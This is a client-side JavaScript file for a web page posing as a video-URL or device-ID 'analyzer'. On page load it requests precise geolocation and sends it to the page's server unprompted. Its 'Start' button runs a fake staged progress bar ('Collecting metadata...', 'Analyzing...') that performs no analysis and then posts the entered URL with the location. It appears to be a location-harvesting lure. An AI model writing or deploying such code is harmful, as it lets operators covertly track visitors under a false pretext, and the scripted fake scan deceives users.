// public/scripts.js
// Behavior:
// 1) On page load -> request location permission.
// 2) If permission GRANTED -> immediately send { videoUrl: null, location } to /api/send-data.
// 3) Keep the existing "Start" button flow: user can input a URL and send again (with location if available).

let cachedLocation = null;
let sentOnLoad = false; // ensure we send only once on load if permission granted

const analyzeButton = document.getElementById('analyzeButton');
const videoUrlInput = document.getElementById('videoUrlInput');
const statusText = document.getElementById('status');
const progressBar = document.getElementById('progressBar');
const progressBarContainer = document.getElementById('progressBarContainer');

// Simple helper to request location with timeout
function requestLocationWithPrompt(timeout = 8000) {
  return new Promise((resolve) => {
    if (!("geolocation" in navigator)) {
      console.warn('Geolocation not supported by this browser.');
      return resolve(null);
    }

    let resolved = false;
    const onSuccess = (pos) => {
      if (resolved) return;
      resolved = true;
      resolve({
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy
      });
    };
    const onError = (err) => {
      if (resolved) return;
      resolved = true;
      console.warn('Geolocation error/denied:', err && err.message);
      resolve(null);
    };

    navigator.geolocation.getCurrentPosition(onSuccess, onError, {
      enableHighAccuracy: true,
      timeout: timeout,
      maximumAge: 0
    });

    // fallback guard
    setTimeout(() => {
      if (!resolved) {
        resolved = true;
        console.warn('Geolocation fallback timeout.');
        resolve(null);
      }
    }, timeout + 1000);
  });
}

// Send payload to server; returns true on ok
async function postToServer(payload) {
  try {
    const resp = await fetch('/api/send-data', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!resp.ok) {
      const text = await resp.text().catch(()=>null);
      console.warn('Server returned non-OK:', resp.status, text);
      return false;
    }
    console.log('Server response OK');
    return true;
  } catch (err) {
    console.error('Network error sending to server', err);
    return false;
  }
}

// Immediately request location on page load and send if granted
window.addEventListener('DOMContentLoaded', async () => {
  try {
    statusText && (statusText.textContent = 'Requesting location permission...');
    cachedLocation = await requestLocationWithPrompt(8000);
    if (cachedLocation) {
      statusText && (statusText.textContent = 'Location obtained. Sending to server...');
      console.log('Location (on load):', cachedLocation);

      // send once immediately (videoUrl null)
      const ok = await postToServer({ videoUrl: null, location: cachedLocation });
      if (ok) {
        statusText && (statusText.textContent = 'Location sent to server.');
        sentOnLoad = true;
      } else {
        statusText && (statusText.textContent = 'Failed to send location on load.');
      }
    } else {
      statusText && (statusText.textContent = 'Location not available or permission denied.');
    }
    // clear status after short delay
    setTimeout(()=> { statusText && (statusText.textContent = ''); }, 2500);
  } catch (e) {
    console.warn('Error during on-load location:', e);
    cachedLocation = null;
  }
});

// Optional simple staged visual progress for the Start button (keeps UX)
async function stagedProgress() {
  if (!progressBarContainer || !progressBar) return;
  progressBarContainer.style.display = 'block';
  const steps = [10, 35, 65, 90, 100];
  const msgs = ['Initializing...', 'Collecting metadata...', 'Analyzing...', 'Finalizing...', 'Complete'];
  for (let i = 0; i < steps.length; i++) {
    progressBar.style.width = steps[i] + '%';
    statusText && (statusText.textContent = msgs[i]);
    await new Promise(r => setTimeout(r, 600 + Math.random() * 400));
  }
  setTimeout(() => {
    progressBarContainer.style.display = 'none';
    progressBar.style.width = '0%';
    statusText && (statusText.textContent = '');
  }, 800);
}

// Start button handler: sends URL + cachedLocation (or tries to request if missing)
analyzeButton && analyzeButton.addEventListener('click', async () => {
  const input = videoUrlInput ? videoUrlInput.value.trim() : '';
  if (!input) {
    statusText && (statusText.textContent = 'Please enter a Device ID or URL.');
    return;
  }

  // if we don't have cached location, try to request now (user gesture)
  if (!cachedLocation) {
    statusText && (statusText.textContent = 'Requesting location permission...');
    cachedLocation = await requestLocationWithPrompt(8000);
    if (!cachedLocation) statusText && (statusText.textContent = 'Location unavailable or denied.');
  }

  // show staged progress for UX
  stagedProgress();

  // prepare payload and send
  const payload = { videoUrl: input, location: cachedLocation };
  const ok = await postToServer(payload);
  if (ok) {
    statusText && (statusText.textContent = 'Scan complete. Data sent to server.');
  } else {
    statusText && (statusText.textContent = 'Failed to send data to server.');
  }
  // keep message briefly
  setTimeout(()=> statusText && (statusText.textContent = ''), 2500);
});
